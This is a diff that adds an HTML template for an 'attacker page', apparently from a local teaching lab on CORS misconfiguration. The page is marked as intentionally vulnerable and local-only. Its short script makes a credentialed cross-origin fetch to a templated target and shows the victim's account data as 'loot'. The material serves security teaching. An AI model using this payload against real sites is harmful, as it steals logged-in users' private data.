@@ -1,0 +1,24 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Loading&hellip;</title>
+<style>body{font-family:sans-serif;max-width:720px;margin:2em auto;padding:0 1em;}</style>
+</head>
+<body>
+<p><strong>&#9888; Intentionally vulnerable. Run locally only.</strong></p>
+<h1>Attacker page &mdash; reading the {{ which }} target</h1>
+<p>Data read cross-origin from <code>{{ target }}</code>:</p>
+<pre id="loot">fetching&hellip;</pre>
+<!-- The only JS is a credentialed cross-origin fetch. credentials:'include' tells the
+     browser to attach the victim's cookie for the target origin. If the target's CORS
+     policy lets THIS origin read the response, the private account data lands in #loot;
+     if not, the browser blocks the read and the catch shows the CORS error. -->
+<script>
+  fetch("{{ target }}", { credentials: "include" })
+    .then(function (r) { return r.text(); })
+    .then(function (body) { document.getElementById("loot").textContent = body; })
+    .catch(function (e) { document.getElementById("loot").textContent = "CORS error: " + e; });
+</script>
+</body>
+</html>
